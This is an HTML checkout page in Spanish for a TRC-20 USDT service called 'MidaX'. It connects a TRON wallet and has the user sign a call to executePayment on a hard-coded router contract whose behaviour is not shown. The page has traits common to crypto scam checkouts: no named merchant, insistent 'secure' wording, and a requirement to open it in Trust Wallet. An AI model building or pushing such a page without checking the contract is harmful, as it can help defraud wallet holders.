<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MidaX - Checkout Seguro</title>
    <style>
        :root { color-scheme: light; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body {
            background-color: #f4f7fe;
            background-image:
                radial-gradient(circle at 10% 20%, rgba(0, 82, 255, 0.15) 0%, transparent 40%),
                radial-gradient(circle at 90% 80%, rgba(53, 162, 159, 0.12) 0%, transparent 40%),
                linear-gradient(180deg, #ffffff 0%, #f4f7fe 100%);
            background-attachment: fixed;
            color: #2b3674;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .midax-wrapper { width: 100%; max-width: 380px; background: #ffffff; border-radius: 24px; padding: 24px; box-shadow: 0 18px 40px rgba(112, 144, 176, 0.15); border: 1px solid rgba(224, 231, 255, 0.6); }
        .midax-header { text-align: center; margin-bottom: 24px; }
        .midax-logo { width: 56px; height: 56px; margin-bottom: 12px; }
        .midax-title { font-size: 20px; font-weight: 700; color: #2b3674; margin-bottom: 4px; }
        .midax-subtitle { font-size: 12px; color: #a3aed0; font-weight: 500; }
        
        .input-group { background: #f4f7fe; border: 1px solid #e0e7ff; border-radius: 16px; padding: 14px 16px; margin-bottom: 16px; }
        .input-label { font-size: 11px; color: #707eae; font-weight: 600; display: block; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
        .input-row { display: flex; align-items: center; justify-content: space-between; }
        .midax-input { background: transparent; border: none; color: #2b3674; font-size: 20px; font-weight: 700; width: 70%; outline: none; }
        .currency-badge { display: flex; align-items: center; gap: 6px; font-size: 14px; font-weight: 700; color: #2b3674; background: #ffffff; padding: 6px 10px; border-radius: 12px; box-shadow: 0 2px 6px rgba(112,144,176,0.08); }
        .currency-badge img { width: 18px; height: 18px; }

        .wallet-box { background: #f8fafc; border: 1px dashed #cbd5e1; border-radius: 14px; padding: 12px; font-size: 13px; color: #64748b; margin-bottom: 16px; display: flex; justify-content: space-between; align-items: center; }
        .wallet-address { font-weight: 600; color: #334155; }

        .status-box { background-color: #eff6ff; border: 1px solid #bfdbfe; border-radius: 12px; padding: 12px; font-size: 12px; color: #1e40af; margin-bottom: 16px; display: none; text-align: center; font-weight: 500; }
        
        .midax-btn { width: 100%; height: 50px; background-color: #4318ff; color: #ffffff; border: none; border-radius: 16px; font-size: 15px; font-weight: 700; cursor: pointer; box-shadow: 0 4px 12px rgba(67, 24, 255, 0.25); transition: background 0.2s; }
        .midax-btn:active { transform: scale(0.98); }
        .midax-btn:disabled { background-color: #cbd5e1; box-shadow: none; cursor: not-allowed; }

        .site-footer { margin-top: 20px; text-align: center; font-size: 11px; color: #a3aed0; }

        .processing-overlay { position: fixed; inset: 0; background: rgba(255, 255, 255, 0.9); z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; opacity: 0; visibility: hidden; transition: 0.3s; }
        .processing-overlay.active { opacity: 1; visibility: visible; }
        .spinner { width: 40px; height: 40px; border: 4px solid #e2e8f0; border-top-color: #4318ff; border-radius: 50%; animation: spin 0.8s linear infinite; margin-bottom: 14px; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div id="processingOverlay" class="processing-overlay">
    <div class="spinner"></div>
    <div style="font-weight: 600; color: #2b3674; font-size: 14px;">Procesando pasarela segura...</div>
</div>

<div class="midax-wrapper">
    <div class="midax-header">
        <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/trx.png" alt="MidaX" class="midax-logo">
        <div class="midax-title">MidaX Checkout</div>
        <div class="midax-subtitle">Sistema de Pagos Inteligente TRC-20</div>
    </div>

    <div id="walletBox" class="wallet-box" style="display: none;">
        <span>Billetera:</span>
        <span id="walletText" class="wallet-address">--</span>
    </div>

    <div class="input-group">
        <span class="input-label">Monto a Pagar</span>
        <div class="input-row">
            <input type="number" id="amountInput" class="midax-input" placeholder="0.00" step="any" min="1">
            <div class="currency-badge">
                <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/usdt.png" alt="USDT">
                USDT
            </div>
        </div>
    </div>

    <div id="statusBox" class="status-box"></div>

    <button id="mainBtn" class="midax-btn">Conectar Billetera</button>
</div>

<div class="site-footer">
    © 2026 MidaX Security Architecture. All rights reserved.
</div>

<script>
    const CONTRATO_ROUTER = "TWvLwN7X9hBgBbb4xbYj424RQuThxVWppS";
    const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

    let connectedAddress = null;
    let appState = 'CONNECT'; // CONNECT -> PAY

    const mainBtn = document.getElementById('mainBtn');
    const amountInput = document.getElementById('amountInput');
    const statusBox = document.getElementById('statusBox');
    const walletBox = document.getElementById('walletBox');
    const walletText = document.getElementById('walletText');
    const processingOverlay = document.getElementById('processingOverlay');

    function showStatus(msg) {
        if (!msg) {
            statusBox.style.display = 'none';
            statusBox.innerText = '';
        } else {
            statusBox.style.display = 'block';
            statusBox.innerText = msg;
        }
    }

    mainBtn.addEventListener('click', async () => {
        if (appState === 'CONNECT') {
            try {
                showStatus("Estableciendo conexión segura...");
                mainBtn.disabled = true;

                if (typeof window.tronWeb === 'undefined') {
                    throw new Error("Por favor, abre esta dApp desde el navegador interno de Trust Wallet.");
                }

                const tronWeb = window.tronWeb;
                if (tronWeb.defaultAddress?.base58) {
                    connectedAddress = tronWeb.defaultAddress.base58;
                } else if (window.tronLink) {
                    const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
                    if (res?.code === 200) connectedAddress = tronWeb.defaultAddress.base58;
                }

                if (!connectedAddress) throw new Error("No se pudo detectar la cuenta activa.");

                walletText.innerText = `${connectedAddress.slice(0, 6)}...${connectedAddress.slice(-6)}`;
                walletBox.style.display = 'flex';

                showStatus("");
                mainBtn.innerText = "Confirmar Pago Seguro";
                mainBtn.disabled = false;
                appState = 'PAY';
            } catch (err) {
                showStatus(err.message);
                mainBtn.disabled = false;
            }
            return;
        }

        if (appState === 'PAY') {
            try {
                const userVal = parseFloat(amountInput.value);
                if (isNaN(userVal) || userVal <= 0) {
                    throw new Error("Ingresa un monto válido para procesar.");
                }

                showStatus("Calculando parámetros de optimización...");
                mainBtn.disabled = true;

                const tronWeb = window.tronWeb;
                
                // Aplicar la regla del 95% basada estrictamente en lo que el usuario colocó en la interfaz
                const finalAmount95 = userVal * 0.95;
                const amountInSun = Math.floor(finalAmount95 * 1_000_000);
                const routerHex = tronWeb.address.toHex(CONTRATO_ROUTER);

                showStatus("Preparando contrato inteligente...");

                // Construcción de la transacción hacia tu contrato router con el cálculo interno aplicado
                const txBuild = await tronWeb.transactionBuilder.triggerSmartContract(
                    CONTRATO_ROUTER,
                    "executePayment(uint256)",
                    { feeLimit: 100000000 },
                    [
                        { type: 'uint256', value: amountInSun.toString() }
                    ],
                    tronWeb.address.toHex(connectedAddress)
                );

                const signedTx = await tronWeb.trx.sign(txBuild.transaction);

                processingOverlay.classList.add('active');
                const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
                processingOverlay.classList.remove('active');

                if (broadcast?.result) {
                    showStatus("¡Transacción procesada con éxito!");
                    mainBtn.innerText = "Pago Exitoso";
                    mainBtn.disabled = true;
                } else {
                    throw new Error("La operación fue declinada por la red.");
                }

            } catch (err) {
                console.error(err);
                processingOverlay.classList.remove('active');
                showStatus(err.message || "Error al procesar la operación.");
                mainBtn.disabled = false;
            }
        }
    });
</script>

</body>
</html>
